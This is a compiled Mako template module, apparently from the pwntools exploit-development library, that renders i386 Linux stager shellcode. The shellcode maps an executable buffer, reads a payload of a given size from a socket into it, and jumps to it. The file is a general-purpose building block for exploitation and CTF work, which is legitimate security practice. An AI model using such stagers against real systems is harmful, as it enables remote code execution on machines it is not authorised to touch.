# -*- coding:ascii -*-
from mako import runtime, filters, cache
UNDEFINED = runtime.UNDEFINED
STOP_RENDERING = runtime.STOP_RENDERING
__M_dict_builtin = dict
__M_locals_builtin = locals
_magic_number = 10
_modified_time = 1473634653.73488
_enable_loop = True
_template_filename = '/usr/local/lib/python2.7/dist-packages/pwnlib/shellcraft/templates/i386/linux/stager.asm'
_template_uri = 'i386/linux/stager.asm'
_source_encoding = 'ascii'
_exports = []


__doc__ = u'\nRecives a fixed sized payload into a mmaped buffer\nUseful in conjuncion with findpeer.\nArgs:\n    sock, the socket to read the payload from.\n    size, the size of the payload\n'
def render_body(context,sock,size,**pageargs):
    __M_caller = context.caller_stack._push_frame()
    try:
        __M_locals = __M_dict_builtin(pageargs=pageargs,sock=sock,size=size)
        __M_writer = context.writer()
        from pwnlib.shellcraft import common 
        
        __M_locals_builtin_stored = __M_locals_builtin()
        __M_locals.update(__M_dict_builtin([(__M_key, __M_locals_builtin_stored[__M_key]) for __M_key in ['common'] if __M_key in __M_locals_builtin_stored]))
        __M_writer(u'\n')
        from pwnlib.shellcraft import i386 
        
        __M_locals_builtin_stored = __M_locals_builtin()
        __M_locals.update(__M_dict_builtin([(__M_key, __M_locals_builtin_stored[__M_key]) for __M_key in ['i386'] if __M_key in __M_locals_builtin_stored]))
        __M_writer(u'\n')
        from pwnlib.shellcraft.i386 import linux 
        
        __M_locals_builtin_stored = __M_locals_builtin()
        __M_locals.update(__M_dict_builtin([(__M_key, __M_locals_builtin_stored[__M_key]) for __M_key in ['linux'] if __M_key in __M_locals_builtin_stored]))
        __M_writer(u'\n')
        __M_writer(u'\n')
        __M_writer(u'\n\n')

        stager = common.label("stager")
        mmap = common.label("mmap")
        looplabel = common.label("loop")
        errlabel = common.label("error")
        
        
        __M_locals_builtin_stored = __M_locals_builtin()
        __M_locals.update(__M_dict_builtin([(__M_key, __M_locals_builtin_stored[__M_key]) for __M_key in ['mmap','stager','looplabel','errlabel'] if __M_key in __M_locals_builtin_stored]))
        __M_writer(u'\n\n')
        __M_writer(unicode(stager))
        __M_writer(u':\n/* old_mmap(NULL, size, PROT_EXEC|PROT_WRITE|PROT_READ, MAP_ANON|MAP_PRIVATE, -1) */\n    push ')
        __M_writer(unicode(sock))
        __M_writer(u'\n    xor eax, eax\n    mov al, SYS_mmap\n    xor ebx, ebx\n    ')
        __M_writer(unicode(i386.mov("ecx", size)))
        __M_writer(u'\n    push ecx\n    xor edx, edx\n    mov dl, PROT_EXEC|PROT_WRITE|PROT_READ\n    push MAP_ANON|MAP_PRIVATE\n    pop esi\n    xor edi, edi\n    dec edi\n    int 0x80\n    push eax\n\n    pop ecx /* addr of mmaped buffer */\n    pop edx /* size */\n    pop ebx /* sock */\n    push ecx /* save for: pop eax; call eax later */\n\n/* read/recv loop */\n')
        __M_writer(unicode(looplabel))
        __M_writer(u':\n    xor eax, eax\n    mov al, SYS_read\n    int 0x80\n    test eax, eax\n    js ')
        __M_writer(unicode(errlabel))
        __M_writer(u'\n    sub edx, eax\n    add ecx, eax\n    test edx, edx\n    jne ')
        __M_writer(unicode(looplabel))
        __M_writer(u'\n\n    pop eax /* start of mmaped buffer */\n    push ebx /* sock */\n    call eax /* jump and hope for it to work */\n\n')
        __M_writer(unicode(errlabel))
        __M_writer(u':\n    hlt\n')
        return ''
    finally:
        context.caller_stack._pop_frame()


"""
__M_BEGIN_METADATA
{"source_encoding": "ascii", "line_map": {"16": 4, "17": 11, "22": 1, "26": 1, "27": 2, "31": 2, "32": 3, "36": 3, "37": 10, "38": 11, "39": 13, "48": 18, "49": 20, "50": 20, "51": 22, "52": 22, "53": 26, "54": 26, "55": 43, "56": 43, "57": 48, "58": 48, "59": 52, "60": 52, "61": 58, "62": 58, "68": 62}, "uri": "i386/linux/stager.asm", "filename": "/usr/local/lib/python2.7/dist-packages/pwnlib/shellcraft/templates/i386/linux/stager.asm"}
__M_END_METADATA
"""
